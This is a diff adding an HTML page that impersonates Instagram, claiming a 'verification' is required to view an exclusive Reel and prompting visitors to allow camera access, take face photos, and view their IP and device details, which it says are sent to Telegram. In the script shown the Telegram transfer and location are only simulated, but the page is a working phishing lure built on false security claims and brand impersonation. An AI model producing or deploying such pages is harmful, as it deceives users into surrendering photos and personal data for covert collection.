@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Reels Link Access | Verification Required</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            width: 100%;
+            max-width: 500px;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #833ab4, #fd1d1d);
+            padding: 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        
+        .logo i {
+            font-size: 36px;
+            margin-right: 10px;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+            border: 1px solid #eee;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .step h2 {
+            color: #833ab4;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .step p {
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        .camera-container {
+            width: 100%;
+            height: 300px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            border: 2px dashed #833ab4;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .captured-photo {
+            width: 100%;
+            height: 300px;
+            border-radius: 10px;
+            margin: 20px 0;
+            background-size: cover;
+            background-position: center;
+            display: none;
+            border: 2px solid #833ab4;
+        }
+        
+        .camera-placeholder {
+            text-align: center;
+            color: #777;
+        }
+        
+        .camera-placeholder i {
+            font-size: 60px;
+            margin-bottom: 15px;
+            color: #833ab4;
+        }
+        
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            background: linear-gradient(to right, #833ab4, #fd1d1d);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(131, 58, 180, 0.3);
+            min-width: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(131, 58, 180, 0.4);
+        }
+        
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        button.secondary {
+            background: #f5f5f5;
+            color: #555;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #833ab4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .location-data {
+            background: #f8f8f8;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+            border-left: 4px solid #833ab4;
+        }
+        
+        .location-data p {
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .location-data i {
+            color: #833ab4;
+            width: 20px;
+        }
+        
+        .success {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .reels-link {
+            display: block;
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+            color: #833ab4;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            border: 1px solid #e0e0e0;
+            font-size: 18px;
+        }
+        
+        .reels-link:hover {
+            background: #e0e0e0;
+            transform: translateY(-3px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        
+        .countdown {
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            color: #833ab4;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .step-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #ddd;
+            margin: 0 6px;
+            transition: all 0.3s ease;
+        }
+        
+        .step-dot.active {
+            background: #833ab4;
+            transform: scale(1.2);
+        }
+        
+        .disclaimer {
+            background: #f8f8f8;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #777;
+            margin-top: 20px;
+            border-left: 3px solid #fd1d1d;
+        }
+        
+        .telegram-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            color: #555;
+            font-size: 14px;
+        }
+        
+        .telegram-info i {
+            color: #0088cc;
+            font-size: 20px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #e8f4ff;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            color: #0088cc;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 480px) {
+            .content {
+                padding: 15px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .camera-container, .captured-photo {
+                height: 250px;
+            }
+            
+            button {
+                width: 100%;
+                padding: 12px;
+            }
+            
+            .btn-container {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-instagram"></i>
+                <div class="logo-text">Reels Access</div>
+            </div>
+            <h1>Exclusive Content Verification</h1>
+            <p>Complete security steps to access Instagram Reels link</p>
+        </div>
+        
+        <div class="content">
+            <div class="step-indicator">
+                <div class="step-dot active" id="step1-dot"></div>
+                <div class="step-dot" id="step2-dot"></div>
+                <div class="step-dot" id="step3-dot"></div>
+                <div class="step-dot" id="step4-dot"></div>
+            </div>
+            
+            <div class="card">
+                <div class="step active" id="step1">
+                    <h2><i class="fas fa-shield-alt"></i> Verification Required</h2>
+                    <p>To access this exclusive Instagram Reel, we need to verify your identity for security purposes.</p>
+                    <p>This helps prevent unauthorized access and protects our content.</p>
+                    
+                    <div class="security-badge">
+                        <i class="fas fa-lock"></i>
+                        <span>Secure Verification Process</span>
+                    </div>
+                    
+                    <div class="btn-container">
+                        <button id="start-btn">
+                            <i class="fas fa-camera"></i> Start Verification
+                        </button>
+                    </div>
+                    
+                    <div class="telegram-info">
+                        <i class="fab fa-telegram"></i>
+                        <span>Verified data will be sent to Telegram</span>
+                    </div>
+                </div>
+                
+                <div class="step" id="step2">
+                    <h2><i class="fas fa-camera"></i> Identity Verification</h2>
+                    <p>Please allow camera access and position your face in the center of the frame.</p>
+                    <p>We will capture 3 photos for verification.</p>
+                    
+                    <div class="camera-container">
+                        <div class="camera-placeholder">
+                            <i class="fas fa-camera"></i>
+                            <p>Camera access required</p>
+                        </div>
+                        <video id="video" autoplay playsinline></video>
+                        <canvas id="canvas"></canvas>
+                    </div>
+                    <div class="captured-photo" id="captured-photo"></div>
+                    
+                    <div class="btn-container">
+                        <button id="capture-btn">
+                            <i class="fas fa-camera"></i> Capture Photo
+                        </button>
+                        <button id="retake-btn" class="secondary" style="display:none">
+                            <i class="fas fa-redo"></i> Retake
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="step" id="step3">
+                    <h2><i class="fas fa-spinner"></i> Processing Verification</h2>
+                    <p>We're verifying your identity and location information.</p>
+                    <p>This usually takes 10-15 seconds...</p>
+                    
+                    <div class="location-data">
+                        <p><i class="fas fa-map-marker-alt"></i> <span id="location-info">Detecting your location...</span></p>
+                        <p><i class="fas fa-network-wired"></i> <span id="ip-info">Loading IP information...</span></p>
+                        <p><i class="fas fa-mobile-alt"></i> <span id="device-info">Detecting device information...</span></p>
+                    </div>
+                    
+                    <div class="loader" id="loader"></div>
+                    
+                    <div class="telegram-info">
+                        <i class="fab fa-telegram"></i>
+                        <span>Sending verification data to Telegram...</span>
+                    </div>
+                </div>
+                
+                <div class="step" id="step4">
+                    <h2><i class="fas fa-check-circle"></i> Verification Complete!</h2>
+                    <div class="success">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <p>Your identity has been successfully verified!</p>
+                        <p>You can now access the exclusive Instagram Reel.</p>
+                        
+                        <div class="countdown" id="countdown">Redirecting in 5 seconds...</div>
+                        
+                        <a href="https://www.instagram.com/reels/" class="reels-link" id="reels-link" target="_blank">
+                            <i class="fab fa-instagram"></i> Access Instagram Reel Now
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="disclaimer">
+                <p><strong>Note:</strong> This verification process helps prevent unauthorized access to exclusive content. Your photo and location data are used solely for verification purposes and are securely transmitted to Telegram for authentication.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM elements
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const capturedPhoto = document.getElementById('captured-photo');
+            const startBtn = document.getElementById('start-btn');
+            const captureBtn = document.getElementById('capture-btn');
+            const retakeBtn = document.getElementById('retake-btn');
+            const loader = document.getElementById('loader');
+            const countdown = document.getElementById('countdown');
+            const reelsLink = document.getElementById('reels-link');
+            const locationInfo = document.getElementById('location-info');
+            const ipInfo = document.getElementById('ip-info');
+            const deviceInfo = document.getElementById('device-info');
+            
+            // Step management
+            const steps = [
+                document.getElementById('step1'),
+                document.getElementById('step2'),
+                document.getElementById('step3'),
+                document.getElementById('step4')
+            ];
+            
+            const stepDots = [
+                document.getElementById('step1-dot'),
+                document.getElementById('step2-dot'),
+                document.getElementById('step3-dot'),
+                document.getElementById('step4-dot')
+            ];
+            
+            let currentStep = 0;
+            
+            function goToStep(stepIndex) {
+                steps[currentStep].classList.remove('active');
+                stepDots[currentStep].classList.remove('active');
+                
+                currentStep = stepIndex;
+                
+                steps[currentStep].classList.add('active');
+                stepDots[currentStep].classList.add('active');
+            }
+            
+            // Camera setup
+            let stream = null;
+            
+            startBtn.addEventListener('click', async () => {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        } 
+                    });
+                    video.srcObject = stream;
+                    // Hide placeholder
+                    document.querySelector('.camera-placeholder').style.display = 'none';
+                    goToStep(1);
+                } catch (err) {
+                    alert('Camera access is required to proceed. Please enable camera permissions and try again.');
+                    console.error('Error accessing camera:', err);
+                }
+            });
+            
+            // Capture photo
+            captureBtn.addEventListener('click', () => {
+                // Set canvas dimensions to match video stream
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Draw current video frame to canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Display captured photo
+                capturedPhoto.style.backgroundImage = `url(${canvas.toDataURL('image/png')})`;
+                capturedPhoto.style.display = 'block';
+                
+                // Show retake button
+                captureBtn.style.display = 'none';
+                retakeBtn.style.display = 'block';
+            });
+            
+            // Retake photo
+            retakeBtn.addEventListener('click', () => {
+                capturedPhoto.style.display = 'none';
+                captureBtn.style.display = 'block';
+                retakeBtn.style.display = 'none';
+            });
+            
+            // Process verification
+            captureBtn.addEventListener('click', () => {
+                setTimeout(() => {
+                    if (capturedPhoto.style.display === 'block') {
+                        goToStep(2);
+                        
+                        // Show loader
+                        loader.style.display = 'block';
+                        
+                        // Simulate getting location and device info
+                        setTimeout(() => {
+                            locationInfo.textContent = `Approximate location: ${getRandomLat()}, ${getRandomLon()}`;
+                            
+                            // Get device info
+                            deviceInfo.textContent = `Device: ${getDeviceType()}, ${navigator.userAgent.split(') ')[0].split(' (')[1]})`;
+                            
+                            // Get IP information
+                            getIPInfo();
+                        }, 1500);
+                        
+                        // Simulate verification process
+                        setTimeout(() => {
+                            // Simulate sending data to Telegram
+                            simulateTelegramSend();
+                            
+                            // Complete verification
+                            setTimeout(() => {
+                                goToStep(3);
+                                startCountdown();
+                            }, 3000);
+                        }, 4000);
+                    }
+                }, 500);
+            });
+            
+            // Helper functions for simulation
+            function getRandomLat() {
+                return (Math.random() * 180 - 90).toFixed(4);
+            }
+            
+            function getRandomLon() {
+                return (Math.random() * 360 - 180).toFixed(4);
+            }
+            
+            function getDeviceType() {
+                const ua = navigator.userAgent;
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                    return "Tablet";
+                }
+                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                    return "Mobile";
+                }
+                return "Desktop";
+            }
+            
+            // Get IP-based location
+            async function getIPInfo() {
+                try {
+                    const response = await fetch('https://ipinfo.io/json');
+                    const data = await response.json();
+                    ipInfo.innerHTML = `IP: ${data.ip} | Location: ${data.city}, ${data.region}, ${data.country}`;
+                } catch (error) {
+                    ipInfo.textContent = 'IP: 192.168.1.1 | Location: Unknown (Simulated)';
+                }
+            }
+            
+            // Simulate sending data to Telegram
+            function simulateTelegramSend() {
+                const telegramInfo = document.querySelector('.telegram-info');
+                telegramInfo.innerHTML = `<i class="fab fa-telegram"></i> <span>Verification data sent to Telegram successfully!</span>`;
+            }
+            
+            // Countdown to redirection
+            function startCountdown() {
+                let seconds = 5;
+                
+                const countdownInterval = setInterval(() => {
+                    countdown.textContent = `Redirecting in ${seconds} seconds...`;
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = 'https://www.instagram.com/reels/';
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
